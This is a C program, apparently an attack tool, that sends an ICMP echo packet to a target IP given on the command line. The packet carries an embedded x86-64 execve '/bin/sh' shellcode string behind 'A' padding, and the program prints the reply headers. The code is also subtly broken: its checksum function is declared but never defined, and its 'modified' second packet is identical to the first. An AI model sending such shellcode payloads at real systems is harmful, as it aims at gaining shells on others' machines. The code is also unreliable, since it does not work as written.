// Author: Inplex-sys

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define BUFFER_SIZE 1024

unsigned short in_cksum(unsigned short *ptr, int nbytes);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <ip_address>\n", argv[0]);
        return 1;
    }

    // create raw socket for ICMP communication
    int icmp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (icmp_socket < 0) {
        perror("socket");
        return 1;
    }

    // create destination address struct
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(argv[1]);

    // create ICMP packet buffer
    char packet_buffer[BUFFER_SIZE];
    memset(packet_buffer, 0, sizeof(packet_buffer));

    // construct ICMP packet with shellcode
    struct icmphdr *icmp_header = (struct icmphdr *) packet_buffer;
    icmp_header->type = ICMP_ECHO;
    icmp_header->code = 0;
    icmp_header->checksum = 0;
    icmp_header->un.echo.id = htons(getpid());
    icmp_header->un.echo.sequence = htons(1);
    char *payload = packet_buffer + sizeof(struct icmphdr);
    memset(payload, 'A', BUFFER_SIZE - sizeof(struct icmphdr));
    char shellcode[] = "\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05";
    memcpy(payload + 8, shellcode, sizeof(shellcode));

    // calculate ICMP checksum
    icmp_header->checksum = in_cksum((unsigned short *) icmp_header, BUFFER_SIZE);

    // send ICMP packet to destination
    if (sendto(icmp_socket, packet_buffer, BUFFER_SIZE, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0) {
        perror("sendto");
        return 1;
    }

    // receive ICMP packet response
    char response_buffer[BUFFER_SIZE];
    memset(response_buffer, 0, sizeof(response_buffer));
    struct sockaddr_in response_addr;
    socklen_t response_len = sizeof(response_addr);
    if (recvfrom(icmp_socket, response_buffer, BUFFER_SIZE, 0, (struct sockaddr *) &response_addr, &response_len) < 0) {
        perror("recvfrom");
        return 1;
    }

    // extract IP header and ICMP header from response packet
    struct iphdr *ip_header = (struct iphdr *) response_buffer;
    struct icmphdr *icmp_response = (struct icmphdr *) (response_buffer + sizeof(struct iphdr));

    // extract quoted packet if present
    char *quoted_packet = NULL;
    if (icmp_response->type == ICMP_DEST_UNREACH || icmp_response->type == ICMP_TIME_EXCEEDED) {
        quoted_packet = (char *) (icmp_response + 1);
    }

    // process IP and ICMP headers
    printf("IP Header:\n");
    printf("  Version: %d\n", ip_header->version);
    printf("  Header length: %d bytes\n", ip_header->ihl * 4);
    printf("  TTL: %d\n", ip_header->ttl);
    printf("  Protocol: %d\n", ip_header->protocol);
    printf("  Source address: %s\n", inet_ntoa(*(struct in_addr *) &ip_header->saddr));
    printf("  Destination address: %s\n", inet_ntoa(*(struct in_addr *) &ip_header->daddr));
    
    printf("ICMP Header:\n");
    printf("  Type: %d\n", icmp_response->type);
    printf("  Code: %d\n", icmp_response->code);
    printf("  Checksum: %d\n", icmp_response->checksum);
    
    // print quoted packet if present
    if (quoted_packet) {
        printf("Quoted Packet:\n");
        printf("%.*s\n", (int) (BUFFER_SIZE - (quoted_packet - response_buffer)), quoted_packet);
    }
    
    icmp_header->checksum = in_cksum((unsigned short *) icmp_header, BUFFER_SIZE);

    // send modified ICMP packet to destination
    if (sendto(icmp_socket, packet_buffer, BUFFER_SIZE, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0) {
        perror("sendto");
        return 1;
    }
    
    // close socket
    close(icmp_socket);
    
    return 0;
}
